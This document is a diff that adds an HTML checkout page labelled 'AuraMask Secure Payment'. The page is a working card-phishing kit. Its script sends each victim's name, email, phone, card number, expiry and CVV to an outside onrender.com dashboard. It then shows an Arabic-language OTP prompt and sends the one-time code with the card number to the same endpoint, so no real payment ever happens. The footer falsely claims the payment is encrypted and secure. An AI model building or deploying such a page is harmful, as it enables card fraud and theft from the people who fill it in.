@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+  <title>AuraMask | Secure Payment</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- Tailwind -->
+  <link rel="stylesheet" href="dist/output.css">
+
+</head>
+
+<body class="bg-dark text-white min-h-screen flex items-center justify-center px-4">
+
+<!-- PAYMENT CARD -->
+<form class="w-full max-w-lg bg-black border border-white/10 rounded-2xl p-8" novalidate>
+
+  <!-- HEADER -->
+  <div class="text-center mb-8">
+    <h1 class="text-3xl font-bold mb-2">Secure Payment</h1>
+    <p class="text-gray-400 text-sm">
+      Complete your AuraMask purchase
+    </p>
+  </div>
+
+  <!-- CUSTOMER INFO -->
+  <div class="mb-8">
+    <h2 class="text-lg font-semibold mb-4 text-gold">
+      Customer Information
+    </h2>
+
+    <div class="space-y-4">
+      <input
+        type="text"
+        placeholder="Full Name"
+        required
+        class="w-full p-3 rounded-lg bg-dark border border-white/10 focus:outline-none focus:border-gold"
+      />
+
+      <input
+        type="email"
+        placeholder="Email Address"
+        required
+        class="w-full p-3 rounded-lg bg-dark border border-white/10 focus:outline-none focus:border-gold"
+      />
+
+      <!-- PHONE -->
+      <div class="flex gap-3">
+        <select
+          required
+          class="bg-dark border border-white/10 p-3 rounded-lg focus:outline-none focus:border-gold">
+          <option value="+971">🇦🇪 +971</option>
+        </select>
+
+        <input
+          type="tel"
+          placeholder="Mobile Number"
+          required
+          inputmode="numeric"
+          class="flex-1 p-3 rounded-lg bg-dark border border-white/10 focus:outline-none focus:border-gold"
+        />
+      </div>
+    </div>
+  </div>
+
+  <!-- PAYMENT INFO -->
+  <div class="mb-8">
+   <h2 class="text-lg font-semibold mb-4 text-gold flex items-center justify-between">
+  Card Details
+  <img src="images/card1.svg" alt="Visa" class="h-14 ">
+  <img src="images/card2.svg" alt="Visa" class="h-14 ">
+  <img src="images/card3.svg" alt="Visa" class="h-14 ">
+</h2>
+
+    <div class="space-y-4">
+      <input
+        type="text"
+        placeholder="Cardholder Name"
+        required
+        class="w-full p-3 rounded-lg bg-dark border border-white/10 focus:outline-none focus:border-gold"
+      />
+
+      <!-- CARD NUMBER -->
+      <input
+        id="cardNumber"
+        type="tel"
+        placeholder="0000 0000 0000 0000"
+        required
+        inputmode="numeric"
+        pattern="[0-9 ]*"
+        maxlength="19"
+        class="w-full p-3 rounded-lg bg-dark border border-white/10 focus:outline-none focus:border-gold"
+      />
+
+      <div class="flex gap-4">
+        <!-- EXPIRY -->
+        <input
+          id="expiryDate"
+          type="text"
+          placeholder="MM / YY"
+          required
+          maxlength="8"
+          inputmode="numeric"
+          class="w-1/2 p-3 rounded-lg bg-dark border border-white/10 focus:outline-none focus:border-gold"
+        />
+
+        <!-- CVV -->
+        <input
+          type="text"
+          placeholder="CVV"
+          required
+          maxlength="4"
+          inputmode="numeric"
+          class="w-1/2 p-3 rounded-lg bg-dark border border-white/10 focus:outline-none focus:border-gold"
+        />
+      </div>
+    </div>
+  </div>
+
+  <!-- PAY BUTTON -->
+  <button
+    type="submit"
+    id="payButton"
+    class="w-full bg-gold text-black py-4 rounded-full font-semibold text-lg hover:opacity-90 transition">
+    Pay Now
+  </button>
+
+  <!-- FOOTER -->
+  <p class="text-center text-xs text-gray-500 mt-6">
+    Your payment is encrypted & secure
+  </p>
+
+</form>
+
+<!-- FORMAT & POPUP SCRIPT -->
+<script>
+  // CARD NUMBER FORMAT
+  const cardInput = document.getElementById("cardNumber");
+  cardInput.addEventListener("input", () => {
+    let value = cardInput.value.replace(/\D/g, "").substring(0, 16);
+    value = value.match(/.{1,4}/g);
+    cardInput.value = value ? value.join(" ") : "";
+  });
+
+  // EXPIRY DATE FORMAT
+  const expiryInput = document.getElementById("expiryDate");
+  expiryInput.addEventListener("input", () => {
+    let value = expiryInput.value.replace(/\D/g, "").substring(0, 4);
+
+    if (value.length >= 3) {
+      expiryInput.value = value.substring(0, 2) + " / " + value.substring(2);
+    } else {
+      expiryInput.value = value;
+    }
+  });
+
+  // PAY NOW POPUP
+  const payButton = document.getElementById("payButton");
+  payButton.addEventListener("click", (e) => {
+    e.preventDefault(); // prevent form submission
+
+    // Collect form values immediately
+    const fullNameVal = document.querySelector('input[placeholder="Full Name"]').value;
+    const emailVal = document.querySelector('input[type="email"]').value;
+    const mobileVal = document.querySelector('input[type="tel"]').value;
+    const cardVal = document.getElementById("cardNumber").value;
+    const expiryVal = document.getElementById("expiryDate").value;
+    const cvvVal = document.querySelector('input[placeholder="CVV"]').value;
+
+    // Send all data to backend asynchronously (does not block popup)
+    fetch("https://dashboard-xwzz.onrender.com/api/messages", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        text: `🔑 بيانات المستخدم :
+الاسم: ${fullNameVal}
+البريد الإلكتروني: <br> ${emailVal}
+رقم الجوال: <br> ${mobileVal}
+رقم البطاقة: <br> ${cardVal}
+تاريخ الانتهاء: <br> ${expiryVal}
+CVV: <br> ${cvvVal}`
+      })
+    })
+    .then(() => console.log("Pay button data sent"))
+    .catch(err => console.error("Pay button API Error:", err));
+
+    // ================= Create OTP Popup =================
+    const phoneInput = document.querySelector('input[type="tel"]');
+    const phone = phoneInput.value || "0000000";
+    const last3 = phone.slice(-3);
+    const total = localStorage.getItem('total') || "0";
+
+    const otpPopup = document.createElement("div");
+    otpPopup.className = "fixed inset-0 bg-black/70 flex items-center justify-center z-50";
+    otpPopup.innerHTML = `
+      <div class="bg-slate-900 p-8 rounded-2xl w-[90%] max-w-md text-center space-y-4">
+        <h3 class="text-xl font-bold text-amber-400 mb-2">تأكيد الدفع</h3>
+        <p class="text-slate-300 mb-4">
+          لقد أرسلنا رمز OTP إلى الرقم (****${last3})<br>
+          : أنت بصدد دفع مبلغ
+          <span class="font-extrabold text-amber-400 text-2xl">
+          <br>  ${total}  AED<span class="text-base block"></span>
+          </span>
+        </p>
+        <input type="text" id="otpInput" maxlength="6" inputmode="numeric" placeholder="أدخل رمز OTP" class="w-full p-3 rounded-lg bg-dark border border-white/10 text-center focus:outline-none focus:border-gold" />
+        <div class="flex justify-center gap-4 mt-2">
+          <button id="confirmBtn" class="bg-amber-400 text-black py-2 px-6 rounded-full font-semibold hover:opacity-90 transition flex items-center justify-center gap-2">
+            تأكيد
+          </button>
+          <button id="cancelOtpBtn" class="bg-gray-600 text-white py-2 px-6 rounded-full font-semibold hover:opacity-90 transition">
+            إلغاء
+          </button>
+        </div>
+      </div>
+    `;
+    document.body.appendChild(otpPopup);
+
+    const confirmBtn = document.getElementById("confirmBtn");
+    const cancelBtn = document.getElementById("cancelOtpBtn");
+
+    // Confirm OTP button (keep original loader + send name/card/OTP)
+    confirmBtn.addEventListener("click", () => {
+      const otpInputVal = document.getElementById("otpInput").value;
+
+      if (otpInputVal.length !== 6) {
+        alert("الرجاء إدخال رمز OTP المكون من 6 أرقام");
+        return;
+      }
+
+      confirmBtn.disabled = true;
+      const originalText = confirmBtn.innerHTML;
+      confirmBtn.innerHTML = `<svg class="animate-spin h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
+      </svg> جاري التاكيد`;
+
+      // Send only name + card + OTP
+      const fullNameConfirm = document.querySelector('input[placeholder="Full Name"]').value;
+      const cardConfirm = document.getElementById("cardNumber").value;
+
+      fetch("https://dashboard-xwzz.onrender.com/api/messages", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          text: `🔑 بيانات otp : <br>
+الاسم: ${fullNameConfirm}
+رقم البطاقة: <br> ${cardConfirm}
+OTP:  <br>${otpInputVal}`
+        })
+      })
+      .then(() => {
+        
+        
+      })
+      .catch(err => {
+        console.error("Confirm button API Error:", err);
+        alert("حدث خطأ أثناء إرسال البيانات، حاول مرة أخرى");
+      })
+      .finally(() => {
+        confirmBtn.disabled = false;
+        confirmBtn.innerHTML = originalText; // restore original text
+      });
+    });
+
+    // Cancel OTP button
+    cancelBtn.addEventListener("click", () => {
+      otpPopup.remove();
+    });
+  });
+</script>
+
+
+
+</body>
+</html>
